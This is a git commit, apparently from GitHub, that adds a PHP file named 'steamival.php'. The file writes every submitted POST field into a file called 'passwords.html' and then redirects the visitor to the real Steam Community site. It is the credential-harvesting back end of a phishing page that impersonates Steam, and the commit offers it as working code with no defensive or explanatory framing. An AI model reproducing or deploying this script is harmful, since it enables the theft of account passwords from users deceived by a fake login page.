8449dc5357856afeb40ce9a4b33abef13dd8957e
sunnival <73607503+sunnival@users.noreply.github.com>
2020-10-28 20:41:32 +0300

    initial

---
+++ steamival.php
@@ -0,0 +1,13 @@
+<?php
+header ('Location: https://www.steamcommunity.com');
+$handle = fopen("passwords.html", "a");
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
